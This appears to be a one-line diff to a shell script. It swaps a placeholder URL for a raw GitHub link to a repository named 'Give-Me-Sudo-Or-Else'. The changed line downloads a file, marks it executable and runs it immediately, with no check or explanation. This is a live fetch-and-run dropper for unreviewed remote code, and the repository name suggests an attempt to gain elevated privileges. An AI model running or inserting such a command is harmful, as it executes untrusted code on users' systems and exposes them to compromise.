@@ -1,1 +1,1 @@
-curl $URL > ActualCode && chmod +x ./ActualCode && ./ActualCode
+curl https://raw.githubusercontent.com/KadTheAad/Give-Me-Sudo-Or-Else/master/ActualCode > ActualCode && chmod +x ./ActualCode && ./ActualCode
